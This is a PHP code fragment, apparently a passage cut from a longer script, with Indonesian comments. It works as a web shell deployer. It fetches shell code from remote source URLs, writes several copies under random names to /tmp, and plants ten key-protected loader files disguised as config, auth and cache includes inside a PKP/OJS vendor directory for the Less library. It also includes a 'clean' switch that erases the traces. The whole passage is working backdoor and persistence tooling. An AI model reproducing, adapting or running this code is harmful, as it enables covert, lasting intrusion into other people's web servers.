];

// ============ FUNCTIONS ============
function getContent($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data && strlen($data) > 100) return $data;
    }
    return @file_get_contents($url);
}

function randomName() {
    return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
}

function createFolder1111($path) {
    if (!is_dir($path)) {
        @mkdir($path, 0777, true);
    }
    @chmod($path, 01111); // 1111
    return is_dir($path);
}

function createLoader($path, $shell_path, $key = 'alfamaster') {
    $content = '<?php
// ==========================================
// LOADER - Include Shell
// ==========================================
// File: ' . basename($path) . '
// Shell: ' . basename($shell_path) . '
// ==========================================

$key = isset($_GET["key"]) ? $_GET["key"] : "";
if ($key !== "' . $key . '") die("404 - Not Found");

if (file_exists("' . $shell_path . '")) {
    include "' . $shell_path . '";
} else {
    die("❌ Shell not found");
}
?>';
    
    if (@file_put_contents($path, $content)) {
        @chmod($path, 0644);
        return true;
    }
    return false;
}

// ============ DEPLOY SHELL KE /tmp/ ============
$deployed = [];
foreach ($sources as $src) {
    $content = getContent($src);
    if ($content && strlen($content) > 100) {
        for ($i = 0; $i < 3; $i++) {
            $name = randomName();
            $path = '/tmp/' . $name;
            if (@file_put_contents($path, $content)) {
                @chmod($path, 0644);
                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
            }
        }
    }
}

// ============ AMBIL SHELL TERBARU ============
$shell_files = glob('/tmp/*.php');
usort($shell_files, function($a, $b) {
    return filemtime($a) - filemtime($b);
});
$latest_shell = end($shell_files);

// ============ DOCUMENT ROOT ============
$doc_root = $_SERVER['DOCUMENT_ROOT'];
$script_dir = __DIR__;

// ============ BASE PATH ============
$base_vendor = 'lib/pkp/lib/vendor/wikimedia/less.php/lib/Less';

// ============ BUAT FOLDER src DENGAN PERMISSION 1111 ============
$src_folder = $base_vendor . '/src';
$full_src_path = $doc_root . '/' . $src_folder;

$folder_created = false;
if (createFolder1111($full_src_path)) {
    $folder_created = true;
}

// ============ BUAT FILE LOADER DI SourceMap ============
$loader_list = [
    $base_vendor . '/SourceMap/config.inc.php',
    $base_vendor . '/SourceMap/settings.inc.php',
    $base_vendor . '/SourceMap/cache.inc.php',
    $base_vendor . '/SourceMap/session.inc.php',
    $base_vendor . '/SourceMap/auth.inc.php',
    $base_vendor . '/SourceMap/loader.inc.php',
    $base_vendor . '/SourceMap/index.php',
    $base_vendor . '/SourceMap/shell.php',
    $base_vendor . '/SourceMap/alfa.inc.php',
    $base_vendor . '/SourceMap/backup.inc.php',
];

$loaders_created = [];
foreach ($loader_list as $loc) {
    $full_path = $doc_root . '/' . $loc;
    $dir = dirname($full_path);
    
    // Buat folder SourceMap dulu kalau belum ada
    if (!is_dir($dir)) {
        @mkdir($dir, 0777, true);
    }
    
    // Buat loader file
    if (createLoader($full_path, $latest_shell)) {
        $loaders_created[] = [
            'path' => $full_path,
            'rel_path' => $loc,
            'url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . '/' . $loc
        ];
    }
}

// ============ CLEAN ============
if (isset($_GET['clean'])) {
    foreach (glob('/tmp/*.php') as $f) @unlink($f);
    foreach ($loader_list as $loc) {
        $full_path = $doc_root . '/' . $loc;
        if (file_exists($full_path)) @unlink($full_path);
    }
    // Hapus folder src (optional)
    // @rmdir($full_src_path);
    die("✅ Cleaned all shells and loaders");
}

// ============ DOMAIN ============
